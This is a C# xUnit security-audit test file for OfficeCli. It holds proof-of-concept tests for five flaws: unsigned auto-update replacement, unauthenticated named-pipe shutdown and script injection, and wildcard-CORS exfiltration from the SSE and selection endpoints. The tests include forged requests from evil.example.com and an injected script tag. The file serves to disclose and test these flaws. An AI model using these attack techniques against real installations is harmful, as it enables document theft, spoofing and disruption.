// Copyright 2025 OfficeCli (officecli.ai)
// SPDX-License-Identifier: Apache-2.0

using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using OfficeCli.Core;
using Xunit;

namespace OfficeCli.Tests;

/// <summary>
/// Security audit tests that demonstrate concrete exploitable vulnerabilities
/// in OfficeCLI. Each test proves a specific attack scenario with a
/// minimal, reproducible proof-of-concept.
///
/// Vulnerabilities covered:
///   VULN-1 (Critical) — Unsigned binary auto-update: no hash / signature check
///   VULN-2 (High)     — Unauthenticated named pipe lets any local process shut
///                        down the Watch Server (Denial of Service)
///   VULN-3 (High)     — Unauthenticated named pipe lets any local process inject
///                        arbitrary HTML / scripts into the document preview
///   VULN-4 (High)     — CORS wildcard on SSE endpoint enables cross-origin
///                        document content exfiltration from any webpage
///   VULN-5 (Medium)   — CORS wildcard on /api/selection lets any webpage
///                        manipulate the user's in-document selection state
/// </summary>
public sealed class SecurityAuditTests : IAsyncDisposable
{
    private readonly List<string> _tempPaths = [];
    private readonly List<WatchServer> _servers = [];
    private readonly List<CancellationTokenSource> _ctsList = [];

    // ── helpers ──────────────────────────────────────────────────────────────

    /// <summary>Allocate a free TCP port and immediately release it.</summary>
    private static int GetFreePort()
    {
        var l = new TcpListener(IPAddress.Loopback, 0);
        l.Start();
        var port = ((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return port;
    }

    private string CreateTempFile(string extension = ".tmp")
    {
        var path = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + extension);
        File.WriteAllText(path, "");
        _tempPaths.Add(path);
        return path;
    }

    private string CreateTempDir()
    {
        var dir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        Directory.CreateDirectory(dir);
        _tempPaths.Add(dir);
        return dir;
    }

    /// <summary>
    /// Start a WatchServer on a free port and wait until both the HTTP listener
    /// and the named pipe are accepting connections before returning.
    /// </summary>
    private async Task<(WatchServer server, int port, Task serverTask)> StartWatchServerAsync(string filePath)
    {
        var port = GetFreePort();
        var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
        var server = new WatchServer(filePath, port, TimeSpan.FromSeconds(30));
        _servers.Add(server);
        _ctsList.Add(cts);

        var serverTask = server.RunAsync(cts.Token);

        // Wait for TCP listener to accept connections.
        await WaitForHttpAsync(port);

        // Wait for named pipe to be ready.
        var pipeName = WatchServer.GetWatchPipeName(filePath);
        await WaitForPipeAsync(pipeName);

        return (server, port, serverTask);
    }

    private static async Task WaitForHttpAsync(int port, int maxAttempts = 40)
    {
        for (var i = 0; i < maxAttempts; i++)
        {
            try
            {
                using var tcp = new TcpClient();
                await tcp.ConnectAsync("127.0.0.1", port);
                return;
            }
            catch
            {
                await Task.Delay(50);
            }
        }
        throw new TimeoutException($"HTTP server not ready on port {port} after {maxAttempts * 50} ms");
    }

    private static async Task WaitForPipeAsync(string pipeName, int maxAttempts = 40)
    {
        for (var i = 0; i < maxAttempts; i++)
        {
            try
            {
                using var pipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut);
                pipe.Connect(100);
                return;
            }
            catch
            {
                await Task.Delay(50);
            }
        }
        throw new TimeoutException($"Named pipe '{pipeName}' not ready after {maxAttempts * 50} ms");
    }

    public async ValueTask DisposeAsync()
    {
        foreach (var cts in _ctsList) { try { cts.Cancel(); } catch (ObjectDisposedException) { } }

        // Give running server tasks time to wind down before disposing.
        await Task.Delay(200);

        foreach (var s in _servers) { try { s.Dispose(); } catch (ObjectDisposedException) { } }
        foreach (var cts in _ctsList) { try { cts.Dispose(); } catch (ObjectDisposedException) { } }

        foreach (var p in _tempPaths)
        {
            try { if (File.Exists(p)) File.Delete(p); } catch (IOException) { }
            try { if (Directory.Exists(p)) Directory.Delete(p, recursive: true); } catch (IOException) { }
        }
    }

    // =========================================================================
    // VULN-1 (Critical): Unsigned binary auto-update
    // =========================================================================

    /// <summary>
    /// <b>Vulnerability</b>: <c>UpdateChecker.TryApplyPendingUpdate</c> (UpdateChecker.cs)
    /// unconditionally replaces the running executable with the file found at
    /// <c>{exePath}.update</c>. There is no SHA-256 / SHA-512 checksum comparison,
    /// no GPG signature verification, and no code-signing check.
    ///
    /// <b>Attack scenario</b>: An adversary who can write to the directory that
    /// contains the officecli binary (e.g. through a compromised CDN response, a
    /// MITM on a non-HSTS network segment, or a local filesystem race) places a
    /// malicious payload at <c>{exe}.update</c>. On the next invocation of officecli
    /// the payload silently replaces the binary — with zero verification.
    ///
    /// <b>Proof</b>: The test places arbitrary content at <c>{exe}.update</c>
    /// and calls <c>TryApplyPendingUpdate</c>. The method applies the file
    /// without checking its authenticity; the executable is replaced.
    /// </summary>
    [Fact]
    public void Vuln1_TryApplyPendingUpdate_ReplacesExecutable_WithoutAnySignatureOrHashCheck()
    {
        var dir = CreateTempDir();
        var exePath = Path.Combine(dir, "officecli-fake");
        var updatePath = exePath + ".update";

        // Legitimate binary already in place.
        const string originalContent = "ORIGINAL_BINARY_CONTENT";
        File.WriteAllText(exePath, originalContent);

        // Attacker places an arbitrary payload at {exe}.update.
        // In a real attack this would be a malicious executable.
        const string attackerPayload = "MALICIOUS_BINARY — NO_HASH_NO_SIGNATURE_CHECKED";
        File.WriteAllText(updatePath, attackerPayload);

        // UpdateChecker applies the file with no verification whatsoever.
        var applied = UpdateChecker.TryApplyPendingUpdate(exePath);

        // --- Proof of vulnerability ---
        Assert.True(applied, "Update must have been applied (no verification blocked it)");
        Assert.False(File.Exists(updatePath), ".update file must be consumed during apply");
        var replacedContent = File.ReadAllText(exePath);
        Assert.Equal(attackerPayload, replacedContent);
        // The original binary has been permanently replaced.
        Assert.NotEqual(originalContent, replacedContent);
    }

    // =========================================================================
    // VULN-2 (High): Unauthenticated pipe → Watch Server DoS
    // =========================================================================

    /// <summary>
    /// <b>Vulnerability</b>: The WatchServer named pipe (<c>officecli-watch-{hash}</c>,
    /// WatchServer.cs) accepts connections from ANY local process. Sending the
    /// literal string <c>close</c> over the pipe causes the server to shut down —
    /// no authentication token or capability proof is required.
    ///
    /// <b>Attack scenario</b>: A malicious process (or compromised dependency)
    /// running under the same user account discovers the pipe name (it is
    /// deterministic from the watched file path), connects, and sends "close"
    /// to disrupt the user's watch session.
    ///
    /// <b>Proof</b>: A plain <c>NamedPipeClientStream</c> — representing any
    /// unprivileged local process — shuts down the running WatchServer without
    /// supplying any credential.
    /// </summary>
    [Fact]
    public async Task Vuln2_WatchServer_NamedPipe_AnyLocalProcess_CanShutDownServerWithoutAuthentication()
    {
        var filePath = CreateTempFile(".docx");
        var (_, _, serverTask) = await StartWatchServerAsync(filePath);

        // Any local process can open the pipe — no credentials, no token.
        var pipeName = WatchServer.GetWatchPipeName(filePath);
        using var attackerPipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut);
        attackerPipe.Connect(3000);

        var noBom = new UTF8Encoding(false);
        using var writer = new StreamWriter(attackerPipe, noBom, leaveOpen: true) { AutoFlush = true };
        using var reader = new StreamReader(attackerPipe, noBom, leaveOpen: true);

        // Send "close" — no authentication required.
        await writer.WriteLineAsync("close");
        var ack = await reader.ReadLineAsync();

        // --- Proof of vulnerability ---
        // Server acknowledges and shuts down.
        Assert.Equal("ok", ack);
        var finished = await Task.WhenAny(serverTask, Task.Delay(5000));
        Assert.True(finished == serverTask,
            "Watch server must have exited after the unauthenticated 'close' command");
    }

    // =========================================================================
    // VULN-3 (High): Unauthenticated pipe → arbitrary HTML injection
    // =========================================================================

    /// <summary>
    /// <b>Vulnerability</b>: The WatchServer named pipe accepts
    /// <c>{"Action":"full","FullHtml":"…"}</c> JSON messages from any local
    /// process. The supplied HTML is stored verbatim and immediately served to
    /// every browser that loads the preview page, including any
    /// <c>&lt;script&gt;</c> tags the attacker includes.
    ///
    /// <b>Attack scenario</b>: A malicious dependency or process replaces the
    /// legitimate document preview with a spoofed UI (phishing) or injects a
    /// script that exfiltrates cookies, local storage, or clipboard content.
    ///
    /// <b>Proof</b>: After injection the HTTP GET response for the preview page
    /// contains the attacker-supplied script tag verbatim.
    /// </summary>
    [Fact]
    public async Task Vuln3_WatchServer_NamedPipe_AnyLocalProcess_CanInjectArbitraryScriptIntoDocumentPreview()
    {
        var filePath = CreateTempFile(".docx");
        var (_, port, _) = await StartWatchServerAsync(filePath);

        // Any local process can open the pipe — no credentials, no token.
        var pipeName = WatchServer.GetWatchPipeName(filePath);
        using var attackerPipe = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut);
        attackerPipe.Connect(3000);

        // Attacker injects HTML containing a malicious script.
        const string injectedScript = "<script>document.cookie='session=stolen'</script>";
        var maliciousHtml = $"<html><body><p>Fake preview</p>{injectedScript}</body></html>";

        // Serialize using the same WatchMessageJsonContext the server uses for
        // deserialization — property names must match (PascalCase, no naming policy).
        var watchMsg = new WatchMessage { Action = "full", FullHtml = maliciousHtml };
        var message = JsonSerializer.Serialize(watchMsg, WatchMessageJsonContext.Default.WatchMessage);

        var noBom = new UTF8Encoding(false);
        using var writer = new StreamWriter(attackerPipe, noBom, leaveOpen: true) { AutoFlush = true };
        using var reader = new StreamReader(attackerPipe, noBom, leaveOpen: true);

        await writer.WriteLineAsync(message);

        // The server writes "ok" before calling HandleWatchMessage; consume it
        // so the pipe write buffer does not stall the server's processing.
        await reader.ReadLineAsync();

        // Allow the server to finish storing the injected HTML.
        await Task.Delay(300);

        // Fetch the preview page as any browser would.
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
        var pageHtml = await http.GetStringAsync($"http://localhost:{port}/");

        // --- Proof of vulnerability ---
        // The malicious script is embedded in the page delivered to the browser.
        Assert.Contains(injectedScript, pageHtml);
    }

    // =========================================================================
    // VULN-4 (High): CORS wildcard on SSE endpoint → cross-origin exfiltration
    // =========================================================================

    /// <summary>
    /// <b>Vulnerability</b>: The WatchServer HTTP server responds with
    /// <c>Access-Control-Allow-Origin: *</c> on its <c>GET /events</c>
    /// (Server-Sent Events) endpoint. This allows a webpage loaded in the
    /// browser — from <em>any</em> origin — to open an EventSource to
    /// <c>http://localhost:{port}/events</c> and receive every document
    /// content update in real time.
    ///
    /// <b>Attack scenario</b>: A victim opens a malicious webpage while also
    /// watching a confidential document. The malicious page runs:
    /// <code>new EventSource('http://localhost:PORT/events')</code>
    /// and streams the document content to the attacker's server.
    ///
    /// <b>Proof</b>: The response to <c>GET /events</c> includes the header
    /// <c>Access-Control-Allow-Origin: *</c>, confirming any origin is allowed.
    /// </summary>
    [Fact]
    public async Task Vuln4_WatchServer_SseEndpoint_ReturnsAcaoWildcard_EnablingCrossOriginDocumentExfiltration()
    {
        var filePath = CreateTempFile(".docx");
        var (_, port, _) = await StartWatchServerAsync(filePath);

        // Simulate a cross-origin EventSource request as sent by a browser
        // on behalf of a page from https://evil.example.com.
        using var tcp = new TcpClient();
        await tcp.ConnectAsync("127.0.0.1", port);
        using var stream = tcp.GetStream();
        stream.ReadTimeout = 3000;

        var request = Encoding.ASCII.GetBytes(
            "GET /events HTTP/1.1\r\n" +
            "Host: localhost\r\n" +
            "Origin: https://evil.example.com\r\n" +
            "Accept: text/event-stream\r\n" +
            "Connection: close\r\n\r\n");
        await stream.WriteAsync(request);

        var buffer = new byte[8192];
        var n = await stream.ReadAsync(buffer);
        var responseHeaders = Encoding.ASCII.GetString(buffer, 0, n);

        // --- Proof of vulnerability ---
        // Server grants the cross-origin request unconditionally.
        Assert.Contains("Access-Control-Allow-Origin: *", responseHeaders);
        Assert.Contains("text/event-stream", responseHeaders);
        // A browser will honour this header and let any page read the SSE stream.
    }

    // =========================================================================
    // VULN-5 (Medium): CORS wildcard on /api/selection → cross-origin manipulation
    // =========================================================================

    /// <summary>
    /// <b>Vulnerability</b>: The WatchServer HTTP server responds with
    /// <c>Access-Control-Allow-Origin: *</c> on its <c>POST /api/selection</c>
    /// endpoint. This lets a webpage from any origin send a cross-origin POST
    /// that overrides the user's current document selection.
    ///
    /// <b>Attack scenario</b>: A malicious page issues a
    /// <c>fetch('http://localhost:PORT/api/selection', {method:'POST', body:'{"paths":["/body/p[1]"]}'})</c>
    /// call. Because the CORS header is a wildcard the browser forwards the
    /// response to the malicious page, and the server has accepted the forged
    /// selection update.
    ///
    /// <b>Proof</b>: A cross-origin POST to <c>/api/selection</c> succeeds
    /// (2xx) and the response carries <c>Access-Control-Allow-Origin: *</c>.
    /// The request body uses the documented JSON schema: <c>{"paths":[...]}</c>.
    /// </summary>
    [Fact]
    public async Task Vuln5_WatchServer_SelectionEndpoint_ReturnsAcaoWildcard_EnablingCrossOriginSelectionManipulation()
    {
        var filePath = CreateTempFile(".docx");
        var (_, port, _) = await StartWatchServerAsync(filePath);

        // Simulate a cross-origin POST from a malicious page.
        // The endpoint expects {"paths": [...]} (SelectionRequest JSON object).
        const string body = """{"paths":["/body/p[1]"]}""";
        // Combine headers + body into a single write so they arrive in one TCP
        // segment, guaranteeing the server reads the complete body in one pass.
        var combined = Encoding.UTF8.GetBytes(
            "POST /api/selection HTTP/1.1\r\n" +
            "Host: localhost\r\n" +
            "Origin: https://evil.example.com\r\n" +
            $"Content-Length: {Encoding.UTF8.GetByteCount(body)}\r\n" +
            "Content-Type: application/json\r\n" +
            "Connection: close\r\n\r\n" +
            body);

        using var tcp = new TcpClient();
        await tcp.ConnectAsync("127.0.0.1", port);
        using var stream = tcp.GetStream();
        stream.ReadTimeout = 5000;

        await stream.WriteAsync(combined);

        var buffer = new byte[4096];
        var n = await stream.ReadAsync(buffer);
        var responseHeaders = Encoding.UTF8.GetString(buffer, 0, n);

        // --- Proof of vulnerability ---
        // Server accepts the cross-origin request and grants the wildcard.
        Assert.Contains("Access-Control-Allow-Origin: *", responseHeaders);
        // Server returns 2xx (204 No Content on success) — request was processed.
        Assert.Contains("HTTP/1.1 204", responseHeaders);
    }
}
